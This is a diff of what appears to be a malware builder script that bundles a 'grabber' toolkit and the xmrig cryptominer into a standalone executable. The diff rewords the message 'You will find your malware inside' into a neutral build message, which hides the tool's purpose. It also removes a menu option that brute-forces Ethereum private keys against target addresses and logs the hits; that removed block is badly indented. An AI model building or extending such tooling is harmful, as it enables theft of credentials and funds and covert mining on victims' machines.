@@ -366,7 +366,7 @@ try:
       else:
         import PyInstaller.__main__
         PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.", "--add-data=./grabber_utils/cosita_toolkit.py:.", "--add-data=./grabber_utils/xmrig:.","--clean","--workpath=./build/"])
-      print(f"You will find your malware inside ./dist/{filename}")
+      print(f"Successfully built in: ./dist/{filename}")
     elif choice == 14:
       usure = input("Are you sure you wanna do that?? [Type 'SHIT' to confirm] ")
       if usure.lower() == "shit":
@@ -380,48 +380,5 @@ try:
               os.remove(file_path)
         try: os.remove("wallets.txt")
         except: pass
-
-    elif choice == 10:
-      from hdwallet import HDWallet
-    from hdwallet.symbols import ETH as SYMBOL
-    from hexer import mHash
-    from colorama import Fore,Style
-    
-    GUI1 = '''
-    ██╗    ██╗ █████╗ ██╗     ██╗     ███████╗████████╗███████╗
-    ██║    ██║██╔══██╗██║     ██║     ██╔════╝╚══██╔══╝██╔════╝
-    ██║ █╗ ██║███████║██║     ██║     █████╗     ██║   ███████╗
-    ██║███╗██║██╔══██║██║     ██║     ██╔══╝     ██║   ╚════██║
-    ╚███╔███╔╝██║  ██║███████╗███████╗███████╗   ██║   ███████║
-    ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ . rip
-
-    best wallet cracker...          
-    '''
-    
-    
-    filename = input('FileName ====================>>====>> ')
-    with open(filename) as f:
-        add = f.read().split()
-    add = set(add)
-    print('\n\n\n\n\n\n\n\n\n\n\n\n', Fore.BLUE, str(GUI1), Style.RESET_ALL, '\n')
-    z = 1
-    while True:
-        hex64 = mHash()
-        PRIVATE_KEY: str = hex64
-        hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
-        hdwallet.from_private_key(private_key=PRIVATE_KEY)
-        priv = hdwallet.private_key()
-        addr = hdwallet.p2pkh_address()
-        print(Fore.WHITE, str(z), Fore.YELLOW, 'Checking: ', Fore.GREEN, str(addr), end='\r')
-        z += 1
-        if addr in add:
-            f = open("wallets.txt","a")
-            f.write('\nAddress = ' + str(addr))
-            f.write('\nPrivate Key = ' + str(priv))
-            f.write('\n=========================================================\n')
-            f.close()
-            print('Winner information Saved On text file')
-            continue
-    finally:
-      print("\n[+] Bye")
-   
+        finally:
+          print("uwu")
